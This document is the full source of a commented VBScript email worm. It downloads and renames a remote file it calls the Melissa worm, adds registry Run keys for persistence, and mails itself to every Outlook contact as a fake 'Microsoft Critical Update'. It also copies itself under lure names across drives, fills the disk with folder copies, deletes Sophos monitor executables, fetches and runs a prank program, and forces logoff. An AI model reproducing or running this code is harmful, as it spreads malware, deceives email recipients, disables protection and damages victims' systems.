'Virus does nothing for a while so that it isn't ovbious!
wscript.sleep 10000
'sets values to run virus
Set WS = CreateObject("WScript.Shell")
Set FSO= Createobject("scripting.filesystemobject")
Set ObjFSO = Createobject("scripting.filesystemobject")

'Virus downloads WM97.Melissa.Worm
set ws = createobject("wscript.shell")
sSource = "http://www.62nds.co.nz/62nds/documents/melissa.txt"
sDest = "C:\documents and settings\melissa.txt"

set oHTTP = WScript.CreateObject("Microsoft.XMLHTTP")
set oFSO = WScript.CreateObject("Scripting.FileSystemObject")

oHTTP.open "GET", sSource, False
oHTTP.send
body8209 = oHTTP.responseBody
set oHTTP = nothing

sOut = ""
For i = 0 to UBound(body8209)
     sOut = sOut & chrw(ascw(chr(ascb(midb(body8209,i+1,1)))))
Next

set oTS = oFSO.CreateTextFile(sDest, True)
oTS.Write sOut
oTS.Close
set oTS = Nothing
set oFSO = Nothing


'Virus adds itself to windows registry to run on Windows startup
ws.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Updatemgrfhe.1", "c:\winnt\updtmgr.vbs"
ws.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Updatemgrfhe.2", "c:\windows\updtmgr.vbs"
ws.regwrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\RegisteredOwner", "VBS/FHE.Worm Creator"

'Virus sets e-mail values
On error resume next
Set s=CreateObject("Outlook.Application")
Set t=s.GetNameSpace("MAPI")
Set u=t.GetDefaultFolder(6)
For i=1 to u.items.count
If u.Items.Item(i).subject="Microsoft Critical Update" Then
u.Items.Item(i).close
u.Items.Item(i).delete
End If
Next
Set u=t.GetDefaultFolder(3)
For i=1 to u.items.count
If u.Items.Item(i).subject="Microsoft Critical Update" Then
u.Items.Item(i).delete
End If
Next

mailit()

'virus copies itself to c:\ drive
Set InF=FSO.OpenTextFile(WScript.ScriptFullname,1)
Do While InF.AtEndOfStream<>True
ScriptBuffer=ScriptBuffer&InF.ReadLine&vbcrlf
Loop

Set OutF=FSO.OpenTextFile(Folder&"C:\FHE.exe",2,true)
OutF.write ScriptBuffer
OutF.close
Set FSO=Nothing

'Virus copies itself to other locations on disk drive
On error resume next
ObjFSO.Copyfile "C:\FHE.exe" ,"C:\winnt\system32\Ginger.exe"
ObjFSO.Copyfile "C:\FHE.exe" ,"C:\winnt\system32\Live Sex.exe"
ObjFSO.Copyfile "C:\FHE.exe" ,"C:\winnt\system32\Free Porn.exe"

On error resume next
ObjFSO.Copyfile "C:\FHE.exe" ,"C:\windows\system32\Ginger.exe"
ObjFSO.Copyfile "C:\FHE.exe" ,"C:\windows\system32\Live Sex.exe"
ObjFSO.Copyfile "C:\FHE.exe" ,"C:\windows\system32\Free Porn.exe"

On error resume next
ObjFSO.CopyFile "C:\FHE.exe" ,"C:\Winnt\updtmgr.vbs"
ObjFSO.CopyFile "C:\FHE.exe" ,"C:\Windows\updtmgr.vbs"


'Virus sends itself in e-mail as attachment in e-mail
Function Mailit()
On Error Resume Next
Set Outlook = CreateObject("Outlook.Application")
If Outlook = "Outlook" Then
        Set Mapi=Outlook.GetNameSpace("MAPI")
        Set Lists=Mapi.AddressLists
        For Each ListIndex In Lists
        If ListIndex.AddressEntries.Count <> 0 Then
        ContactCount = ListIndex.AddressEntries.Count
                        For Count= 1 To ContactCount
                        Set Mail = Outlook.CreateItem(0)
                        Set Contact = ListIndex.AddressEntries(Count)
        Mail.From = msupport
        Mail.To = Contact.Address
        Mail.Subject = "Microsoft Critical Update"
        Mail.Body = vbcrlf&"Dear Windows User"&vbcrlf&vbcrlf&"Our Windows watch server has detected that you have not got full protection against viruses and spyware. Open the attachment to recieve the update manager."&vbcrlf&vbcrlf
                         Set Attachment=Mail.Attachments
                         On error resume next
                         Attachment.Add Folder & "C:\winnt\updtmgr.vbs"
                         Attachment.Add Folder & "C:\windows\updtmgr.vbs"
                         Attachment.Add Folder & "\VirusKiller.exe"
                         Mail.DeleteAfterSubmit = True
                                If Mail.To <> "" Then
                                Mail.Send
                                WS.regwrite "HKCU\software\Vbs.FHE\Sent to ther machines", "1"
                        End If
                        Next
                End If
        Next
End if
End Function

'Virus converts melissa.txt to melissa.vbs
'Melissa worm will not be detected by anti-virus as it is encrypted
objfso.copyfile "c:\documents and settings\melissa.txt" ,"c:\documents and settings\wm97.melissa.vbs"
objfso.deletefile "c:\documents and settings\melissa.txt"


'Virus spreads to a few drive letters
On error resume next
objfso.copyfile "c:\FHE.exe", "C:\WinfileDAT.vbs"
objfso.copyfile "c:\FHE.exe", "D:\WinfileDAT.vbs"
objfso.copyfile "c:\FHE.exe", "E:\WinfileDAT.vbs"
objfso.copyfile "c:\FHE.exe", "F:\WinfileDAT.vbs"
objfso.copyfile "c:\FHE.exe", "G:\WinfileDAT.vbs"
objfso.copyfile "c:\FHE.exe", "H:\WinfileDAT.vbs"
objfso.copyfile "c:\FHE.exe", "Z:\WinfileDAT.vbs"
objfso.copyfile "c:\FHE.exe", "Y:\WinfileDAT.vbs"
objfso.copyfile "c:\FHE.exe", "U:\WinfileDAT.vbs"

'Virus rests for a while
wscript.sleep 10000

'Virus ejects cd rom and blows rasberries
set ws = createobject("wscript.shell")
sSource = "http://www.computerpranks.com/download/programs/prank/RudeCDTray.exe"
sDest = "C:\joke.exe"


set oHTTP = WScript.CreateObject("Microsoft.XMLHTTP")
set oFSO = WScript.CreateObject("Scripting.FileSystemObject")

oHTTP.open "GET", sSource, False
oHTTP.send
body8209 = oHTTP.responseBody
set oHTTP = nothing

sOut = ""
For i = 0 to UBound(body8209)
     sOut = sOut & chrw(ascw(chr(ascb(midb(body8209,i+1,1)))))
Next

set oTS = oFSO.CreateTextFile(sDest, True)
oTS.Write sOut
oTS.Close
set oTS = Nothing
set oFSO = Nothing

wscript.sleep 10000
'Virus cpoies to more locations
objfso.copyfile "c:\FHE.exe" ,"C:\winnt\Jilhu.exe"
objfso.copyfile "c:\FHE.exe" ,"C:\windows\Jilhu.exe"

objfso.copyfile "c:\FHE.exe" ,"\Anti-Virus Enhancements.exe"
objfso.copyfile "c:\FHE.exe" ,"\Shark.jpeg"


'Virus uses up your diskspace by copying drive C:\ to itself,pretends to be a drive backup
on error resume next
set objfso = createobject("scripting.filesystemobject")
objfso.createfolder "C:\DrvBackup"
objfso.copyfolder "C:\program files" ,"C:\DrvBackup\"
objfso.copyfolder "C:\documents and settings" ,"C:\DrvBackup\"

'Virus Makes A Bug Folder to copy itself into
On error resume next
objfso.createfolder "C:\winnt\FHEGERM"
objfso.createfolder "C:\windows\FHEGERM"
objfso.copyfile "C:\FHE.exe" ,"C:\Winnt\FHEGERM\1.vbs"
objfso.copyfile "C:\FHE.exe" ,"C:\Windows\FHEGERM\1.vbs"
objfso.copyfile "C:\FHE.exe" ,"C:\Winnt\FHEGERM\2.vbs"
objfso.copyfile "C:\FHE.exe" ,"C:\Windows\FHEGERM\2.vbs"
objfso.copyfile "C:\FHE.exe" ,"C:\Winnt\FHEGERM\3.vbs"
objfso.copyfile "C:\FHE.exe" ,"C:\Windows\FHEGERM\3.vbs"
objfso.copyfile "C:\FHE.exe" ,"C:\Winnt\FHEGERM\4.vbs"
objfso.copyfile "C:\FHE.exe" ,"C:\Windows\FHEGERM\4.vbs"

objfso.copyfile "C:\FHE.exe" ,"C:\Winnt\FHEGERM\5.vbs"
objfso.copyfile "C:\FHE.exe" ,"C:\Windows\FHEGERM\5.vbs"
objfso.copyfile "C:\FHE.exe" ,"C:\Winnt\FHEGERM\6.vbs"
objfso.copyfile "C:\FHE.exe" ,"C:\Windows\FHEGERM\6.vbs"
objfso.copyfile "C:\FHE.exe" ,"C:\Winnt\FHEGERM\7.vbs"
objfso.copyfile "C:\FHE.exe" ,"C:\Windows\FHEGERM\7.vbs"
objfso.copyfile "C:\FHE.exe" ,"C:\Winnt\FHEGERM\8.vbs"
objfso.copyfile "C:\FHE.exe" ,"C:\Windows\FHEGERM\8.vbs"


On error resume next
objfso.createfolder "C:\winnt\DRVBackup2"
objfso.createfolder "C:\Winnt\DRVBackup3"
objfso.createfolder "C:\windows\DRVBackup2"
objfso.createfolder "C:\Windows\DRVBackup3"

On error resume next
objfso.copyfolder "C:\DrvBackup" ,"C:\winnt\DRVBackup2"
objfso.copyfolder "C:\DrvBackup" ,"C:\winnt\DRVBackup3"
objfso.copyfolder "C:\DrvBackup" ,"C:\windows\DRVBackup2"
objfso.copyfolder "C:\DrvBackup" ,"C:\windows\DRVBackup3"

'Virus attempts to disable sophos anti-virus software from scanning automatically

ObjFSO.DeleteFile "ICMON.exe"
ObjFso.DeleteFile "ICNTMON.exe"


On error resume next
ws.run("C:\joke.exe")
ws.run("c:\winnt\updtmgr.vbs")
ws.run("C:\windows\updtmgr.vbs")

wscript.sleep 1000000
ws.regwrite "HKLM\Software\ComputerLoggedOff", "Logged off"
ws.run("logoff")

'End Script
